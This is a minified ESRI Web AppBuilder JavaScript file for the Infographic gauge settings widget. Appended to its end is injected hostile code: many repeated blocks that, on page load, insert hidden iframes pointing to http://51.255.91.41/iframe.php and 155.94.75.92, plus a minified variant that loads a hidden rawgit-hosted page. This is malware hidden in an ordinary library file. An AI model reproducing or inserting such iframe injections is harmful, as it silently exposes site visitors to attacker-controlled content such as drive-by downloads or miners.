// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/GaugeDijitSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"settingTitle" class\x3d"settingTitle"\x3e${nls.gaugeSettings}\x3c/div\x3e\r\n  \x3cdiv class\x3d"infohraphic-setting-tab-container" style\x3d"width:100%;"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"tabNode" class\x3d"infohraphic-setting-tab-container"\x3e\x3c/div\x3e\r\n    \x3c!-- data tab --\x3e\r\n    \x3cdiv style\x3d"margin-top: 10px;" class\x3d"settingTabs" data-dojo-attach-point\x3d"dataTab"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"singleNumberStatisticsDiv"\x3e\x3c/div\x3e\r\n\r\n      \x3cdiv class\x3d"flex flex-leave1"\x3e\r\n        \x3cdiv style\x3d"width: 210px;" class\x3d"flex-leave2-left font-style textOverFlow" title\x3d"${nls.dataRange}"\x3e${nls.dataRange}\x3c/div\x3e\r\n        \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n          \x3cdiv class\x3d"flex-leave3-left font-style textOverFlow text-left-center" font-style title\x3d"${nls.min}"\x3e${nls.min}\x3c/div\x3e\r\n          \x3cdiv class\x3d"flex-leave3-right"\x3e\r\n            \x3cinput value\x3d0 class\x3d"data-range-value" type\x3d"text"data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"regExp:\'^\\\\d+(\\\\.\\\\d+)?$\'" required\x3d"true" data-dojo-attach-point\x3d"dataRangeMin" data-dojo-attach-event\x3d"change:_onSettingsChange"/\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \r\n      \x3cdiv class\x3d"flex flex-leave1 margin-top-11"\x3e\r\n        \x3cdiv style\x3d"width: 210px;" class\x3d"flex-leave2-left"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n          \x3cdiv class\x3d"flex-leave3-left font-style textOverFlow text-left-center" title\x3d"${nls.max}"\x3e${nls.max}\x3c/div\x3e\r\n          \x3cdiv class\x3d"flex-leave3-right"\x3e\r\n            \x3cinput value\x3d0 class\x3d"data-range-value" type\x3d"text"data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"regExp:\'^\\\\d+(\\\\.\\\\d+)?$\'" required\x3d"true" data-dojo-attach-point\x3d"dataRangeMax" data-dojo-attach-event\x3d"change:_onSettingsChange"/\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- display tab --\x3e\r\n    \x3cdiv style\x3d"margin-top: 20px;" data-dojo-attach-point\x3d"display" class\x3d"display-container paddingRight10"\x3e\r\n\r\n      \x3cdiv class\x3d"flex flex-leave1 align-items-center"\x3e\r\n        \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.backgroundColor}"\x3e${nls.backgroundColor}\x3c/div\x3e\r\n         \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n           \x3cdiv data-dojo-attach-point\x3d"backgroundColorPickerDiv"\x3e\x3c/div\x3e\r\n         \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \r\n      \x3cdiv class\x3d"flex flex-leave1 margin-top-11 align-items-center"\x3e\r\n        \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.gaugeColor}"\x3e${nls.gaugeColor}\x3c/div\x3e\r\n         \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n           \x3cdiv data-dojo-attach-point\x3d"gaugeColorPickerDiv"\x3e\x3c/div\x3e\r\n         \x3c/div\x3e\r\n      \x3c/div\x3e\r\n\r\n\r\n      \x3cdiv data-dojo-attach-point\x3d"dataLabelsToggle" class\x3d"margin-top-11"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"dataLabelsSettingNode" class\x3d"top-bottom-setting-div"\x3e\r\n\r\n        \x3cdiv class\x3d"flex flex-leave1 margin-top-11 align-items-center"\x3e\r\n          \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.textColor}"\x3e${nls.textColor}\x3c/div\x3e\r\n           \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n             \x3cdiv data-dojo-attach-point\x3d"dataLabelsColorPickerNode"\x3e\x3c/div\x3e\r\n           \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \r\n        \x3cdiv class\x3d"flex flex-leave1 margin-top-11 align-items-center"\x3e\r\n          \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.dataRange}"\x3e${nls.dataRange}\x3c/div\x3e\r\n           \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n             \x3cdiv data-dojo-attach-point\x3d"dataRangeSwitch" class\x3d"toggle toggle-on"\x3e\x3c/div\x3e\r\n           \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \r\n        \x3cdiv class\x3d"flex flex-leave1 margin-top-11 align-items-center"\x3e\r\n          \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.targetValue}"\x3e\x3cdiv\x3e${nls.targetValue}\x3c/div\x3e\x3c/div\x3e\r\n           \x3cdiv class\x3d"flex flex-leave2-right"\x3e\r\n             \x3cdiv data-dojo-attach-point\x3d"targetValueSwitch" class\x3d"toggle toggle-off"\x3e\x3c/div\x3e\r\n           \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n      \x3c/div\x3e\r\n\r\n      \x3cdiv data-dojo-attach-point\x3d"currentValueToggle"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"currentValueSettingNode"\x3e\r\n        \x3c!-- display in --\x3e\r\n        \x3cdiv style\x3d"margin-top: 15px" class\x3d"flex flex-leave1"\x3e\r\n          \x3cdiv class\x3d"flex-leave2-left textOverFlow font-style" title\x3d"${nls.displayValueIn}"\x3e${nls.displayValueIn}\x3c/div\x3e\r\n           \x3cdiv class\x3d"flex-start flex-leave2-right"\x3e\r\n              \x3cinput type\x3d"radio" name\x3d"displayIn" data-dojo-attach-event\x3d"change:_onDiaplayInRatio" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"ratioBtn"\x3e\r\n              \x3clabel class\x3d"marginleft10"\x3e${nls.ratio}\x3c/label\x3e\r\n           \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n        \x3cdiv class\x3d"flex flex-leave1 margin-top-11"\x3e\r\n          \x3cdiv class\x3d"flex-leave2-left font-style"\x3e\x3c/div\x3e\r\n           \x3cdiv class\x3d"flex-start flex-leave2-right"\x3e\r\n              \x3cinput type\x3d"radio" checked\x3d"true" name\x3d"displayIn" data-dojo-attach-event\x3d"change:_onDisplayInTrueValue" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"trueValueBtn"\x3e\r\n              \x3clabel class\x3d"marginleft10"\x3e${nls.trueValue}\x3c/label\x3e\r\n           \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n        \x3cdiv data-dojo-attach-point\x3d"dataFormatSettingNode" class\x3d"margin-top-11"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"fontSettingNode"\x3e\x3c/div\x3e\r\n\r\n      \x3c/div\x3e\r\n\r\n    \x3c/div\x3e\r\n    \x3c!-- indicators tab --\x3e\r\n  \t\x3cdiv style\x3d"margin-top: 20px;" class\x3d"indicatorsTitlePane paddingRight10" data-dojo-attach-point\x3d"indicatorsDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/_base/Color dojo/on ./BaseDijitSetting dojo/text!./GaugeDijitSetting.html ./_dijits/SingleNumberStatistics ./_dijits/FontSetting ./_dijits/DataFormatSetting ./_dijits/MultipleIndicators ./_dijits/TogglePocket jimu/dijit/TabContainer3 jimu/dijit/ColorPickerPopup jimu/utils dijit/TitlePane".split(" "),function(l,m,c,e,f,d,n,p,q,r,t,u,k,v,h,g){return l([n,m],{templateString:p,baseClass:"infographic-gauge-dijit-setting",
type:"gauge",postMixInProperties:function(){c.mixin(this.nls,window.jimuNls.common)},postCreate:function(){this.inherited(arguments);this._initTabs();this._initDisplay();this._initIndicators();this._initSingNumberStatistics();this._initEvent();this.setConfig(this.config);this._hasLoaded=!0},_initEvent:function(){this.own(d(this.dataRangeSwitch,"click",c.hitch(this,function(){this._handleToggleBtn(this.dataRangeSwitch,!e.hasClass(this.dataRangeSwitch,"toggle-on"))})));this.own(d(this.targetValueSwitch,
"click",c.hitch(this,function(){this._handleToggleBtn(this.targetValueSwitch,!e.hasClass(this.targetValueSwitch,"toggle-on"))})))},_initDisplay:function(){this._initToggle();this.backgroundColorPicker=new h({appearance:{showTransparent:!1,showColorPalette:!0,showCoustom:!0,showCoustomRecord:!0}});this.backgroundColorPicker.placeAt(this.backgroundColorPickerDiv);this.backgroundColorPicker.startup();this.backgroundColorPicker.setColor(new f("#FFFFFF"));this.own(d(this.backgroundColorPicker,"change",
c.hitch(this,function(){this.backgroundColorPicker.hideTooltipDialog();this._onSettingsChange()})));this.gaugeColorPicker=new h({appearance:{showTransparent:!1,showColorPalette:!0,showCoustom:!0,showCoustomRecord:!0}});this.gaugeColorPicker.placeAt(this.gaugeColorPickerDiv);this.gaugeColorPicker.startup();this.gaugeColorPicker.setColor(new f("#49B4CB"));this.own(d(this.gaugeColorPicker,"change",c.hitch(this,function(){this.gaugeColorPicker.hideTooltipDialog();this._onSettingsChange()})));this.dataLabelsColorPicker=
new h({appearance:{showTransparent:!1,showColorPalette:!0,showCoustom:!0,showCoustomRecord:!0}});this.dataLabelsColorPicker.placeAt(this.dataLabelsColorPickerNode);this.dataLabelsColorPicker.startup();this.dataLabelsColorPicker.setColor(new f("#000001"));this.own(d(this.dataLabelsColorPicker,"change",c.hitch(this,function(){this._onSettingsChange()})));this.dataFormatSetting=new t({nls:this.nls});this.dataFormatSetting.placeAt(this.dataFormatSettingNode);this.dataFormatSetting.startup();this.own(d(this.dataFormatSetting,
"change",c.hitch(this,function(){this._onSettingsChange()})));this.fontSetting=new r({appearance:{underline:!1},nls:this.nls});this.fontSetting.placeAt(this.fontSettingNode);this.fontSetting.startup();this.own(d(this.fontSetting,"change",c.hitch(this,function(){this._onSettingsChange()})))},_initToggle:function(){this.dataLabelsTogglePocket=new k({titleLabel:this.nls.dataLabels,content:this.dataLabelsSettingNode});this.dataLabelsTogglePocket.placeAt(this.dataLabelsToggle);this.dataLabelsTogglePocket.startup();
this.dataLabelsTogglePocket.setState(!0);this.own(d(this.dataLabelsTogglePocket,"change",c.hitch(this,function(){this._onSettingsChange()})));this.currentValueTogglePocket=new k({titleLabel:this.nls.currentValue,content:this.currentValueSettingNode});this.currentValueTogglePocket.placeAt(this.currentValueToggle);this.currentValueTogglePocket.startup();this.currentValueTogglePocket.setState(!0);this.own(d(this.currentValueTogglePocket,"change",c.hitch(this,function(){this._onSettingsChange()})))},
_initTabs:function(){this.tab=new v({average:!0,tabs:[{title:this.nls.data,content:this.dataTab},{title:this.nls.display,content:this.display},{title:this.nls.indicators,content:this.indicatorsDiv}]},this.tabNode)},getConfig:function(){this.config||(this.config={});var a=this.dataRangeMax.getValue(),b=this.dataRangeMin.getValue();if(!this.dataRangeMin.isValid()||""===b||!this.dataRangeMax.isValid()||""===a)return!1;this.config.min=Number(b);this.config.max=Number(a);a=this.indicators.getConfig();
this.config.indicators=a;a=this.singleNumberStatistics.getConfig();if(!a)return!1;this.config.statistic=a;a={};this._bgColor&&(a.bgColor=this._bgColor);this.backgroundColorPicker&&(a.backgroundColor=this.backgroundColorPicker.getColor().toHex());this.gaugeColorPicker&&(a.gaugeColor=this.gaugeColorPicker.getColor().toHex());b={};b.state=this.dataLabelsTogglePocket.getState();this.dataLabelsColorPicker&&(b.textColor=this.dataLabelsColorPicker.getColor().toHex());b.dataRange=e.hasClass(this.dataRangeSwitch,
"toggle-on");b.targetValue=e.hasClass(this.targetValueSwitch,"toggle-on");a.dataLabels=b;b={};b.state=this.currentValueTogglePocket.getState();b.isRatio=!!this.ratioBtn.checked;this.fontSetting&&(b.font=this.fontSetting.getConfig());this.dataFormatSetting&&(b.dataFormat=this.dataFormatSetting.getConfig());a.currentValue=b;this.config.display=a;return this.config},_handleToggleBtn:function(a,b){b?(e.removeClass(a,"toggle-off"),e.addClass(a,"toggle-on")):(e.removeClass(a,"toggle-on"),e.addClass(a,"toggle-off"));
this._onSettingsChange()},setConfig:function(a){if(this.config=a)if(this.singleNumberStatistics.setConfig(this.config.statistic),this.dataRangeMin.setValue(this.config.min),this.dataRangeMax.setValue(this.config.max),this.indicators.setConfig(this.config),g.isNotEmptyObject(this.config.display)){a=this.config.display;a.bgColor&&(this._bgColor=a.bgColor);a.backgroundColor&&this.backgroundColorPicker.setColor(new f(a.backgroundColor));a.gaugeColor&&this.gaugeColorPicker.setColor(new f(a.gaugeColor));
if(g.isNotEmptyObject(a.dataLabels)){var b=a.dataLabels;b.textColor&&this.dataLabelsColorPicker.setColor(new f(b.textColor));this._handleToggleBtn(this.dataRangeSwitch,!!b.dataRange);this._handleToggleBtn(this.targetValueSwitch,!!b.targetValue);this.dataLabelsTogglePocket.setState(b.state)}g.isNotEmptyObject(a.currentValue)&&(a=a.currentValue,a.isRatio?(this.ratioBtn.setChecked(!0),this.trueValueBtn.setChecked(!1)):(this.trueValueBtn.setChecked(!0),this.ratioBtn.setChecked(!1)),g.isNotEmptyObject(a.dataFormat)&&
this.dataFormatSetting.setConfig(a.dataFormat),g.isNotEmptyObject(a.font)&&this.fontSetting.setConfig(a.font),this.currentValueTogglePocket.setState(a.state))}},_onDisplayInChange:function(a){"ratio"===a?(this.dataFormatSetting.setConfig({unit:"percentage"}),this.dataFormatSetting.disableItem("unit")):(this.dataFormatSetting.setConfig({unit:"none"}),this.dataFormatSetting.enableItem("unit"));this._onSettingsChange()},_onDiaplayInRatio:function(a){a&&this._onDisplayInChange("ratio")},_onDisplayInTrueValue:function(a){a&&
this._onDisplayInChange("trueValue")},_onSettingsChange:function(){this._hasLoaded&&(this.getConfig(),setTimeout(function(){this.updateDijit()}.bind(this),100))},updateDijit:function(){g.isEqual(this.cacheConfig,this.config)||this.dijit.setConfig(this.config);this.cacheConfig=null;this.cacheConfig=c.clone(this.config)},_initSingNumberStatistics:function(){this.singleNumberStatistics=new q({config:this.config.statistic,dataSource:this.dataSource,nls:this.nls});this.singleNumberStatistics.placeAt(this.singleNumberStatisticsDiv);
this.singleNumberStatistics.startup();this.own(d(this.singleNumberStatistics,"change",c.hitch(this,function(a){var b=this.dataFormatSetting.getConfig(),c=b.decimalPlaces;if(a&&"Features"===a.type){if("number"!==typeof c||2===c)b.decimalPlaces=0,this.dataFormatSetting.setConfig(b)}else!a||"FeatureStatistics"!==a.type||"number"===typeof c&&0!==c||(b.decimalPlaces=2,this.dataFormatSetting.setConfig(b));this._onSettingsChange()})))},setDataSource:function(a){this.dataSource=a;this.singleNumberStatistics&&
this.singleNumberStatistics.setDataSource(a)},_initIndicators:function(){this.indicators=new u({type:"gauge",nls:this.nls,folderUrl:this.folderUrl});this.indicators.placeAt(this.indicatorsDiv);this.indicators.startup();this.own(d(this.indicators,"change",c.hitch(this,function(){this._onSettingsChange()})))},destroy:function(){this.singleNumberStatistics&&(this.singleNumberStatistics.destroy(),this.singleNumberStatistics=null);this.indicators&&(this.indicators.destroy(),this.indicators=null);this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});